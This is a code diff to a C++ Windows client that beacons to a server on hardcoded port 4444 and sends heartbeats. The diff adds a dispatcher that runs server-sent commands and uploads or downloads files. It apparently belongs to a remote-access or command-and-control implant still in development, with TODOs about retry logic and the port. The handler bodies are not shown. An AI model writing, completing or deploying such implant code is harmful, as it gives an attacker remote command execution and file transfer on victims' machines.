@@ -1,4 +1,7 @@
 #include "Transporter.h"
+#include "MessageTypes.h"
+#include "MessageHandler.h"
+
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
@@ -31,7 +34,7 @@ void Transporter::beacon()
     auto incoming = receiveMessage();
     if (incoming.header.messageType != DEFAULT)
     {
-        handleIncomingMessage(incoming);
+        handleIncomingMessage(incoming); // TODO: move this logic/function into MessageHandler?
     }
 }
 
@@ -44,9 +47,36 @@ InternalMessage Transporter::createHeartbeat()
     return msg;
 }
 
-void Transporter::handleIncomingMessage(const InternalMessage& msg)
+// TODO: move this logic/function into MessageHandler?
+void Transporter::handleIncomingMessage(InternalMessage& msg)
 {
-    // TODO; 
+    switch (msg.header.messageType)
+    {
+    case MessageType::EXECUTE_COMMAND:
+        messageHandler_->executeCommand(msg.data);
+        //messageHandler_->executeCommand(msg.data, msg.header.messageId);
+        break;
+
+    case UPLOAD_FILE:
+        messageHandler_->uploadFile(msg.data);
+        break;
+
+    case DOWNLOAD_FILE:
+        messageHandler_->downloadFile(msg.data);
+        //messageHandler_->downloadFile(parseFilename(msg.data), msg.header.messageId);
+        break;
+
+    case CONFIG_UPDATE:
+        messageHandler_->updateConfig(msg.data);
+        break;
+
+    case ERROR_REPORT:
+        // Server sent an error, handle it
+        messageHandler_->handleServerError(msg.data);
+        break;
+    default:
+        std::cout << "inside default InternalMessage" << std::endl;
+    }
 }
 
 uint32_t Transporter::generateId()
@@ -101,11 +131,15 @@ bool TCPTransporter::connect()
 
     ADDRINFOA hints, *result = nullptr;
     ZeroMemory(&hints, sizeof(hints));
+    // TODO: do this instead of ZeroMemory
+    //ADDRINFOA hints = { 0 };
+    //ADDRINFOA* result = nullptr;
+
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
     hints.ai_protocol = IPPROTO_TCP;
     //if (getaddrinfo(server_.c_str(), (std::to_string(port_)).c_str(), &hints, &result) != 0)
-    if (getaddrinfo(server_.c_str(), "4444", &hints, &result) != 0)
+    if (getaddrinfo(server_.c_str(), "4444", &hints, &result) != 0) // TODO: use port_ instead of hardcode
     {
         //std::cout << "getaddrinfo failed" << std::endl;
         printf("getaddrinfo failed\n");
@@ -131,17 +165,12 @@ bool TCPTransporter::connect()
 
     if (connected_ == false)
     {
+        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
         std::cout << "connected_ == false" << std::endl;
-    }
-
-    /*
-    if (::connect(socket_, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
-    {
-        std::cout << "failed to connect" << std::endl;
         closesocket(socket_);
         socket_ = INVALID_SOCKET;
         return false;
-    }*/
+    }
 
     return true;
 }
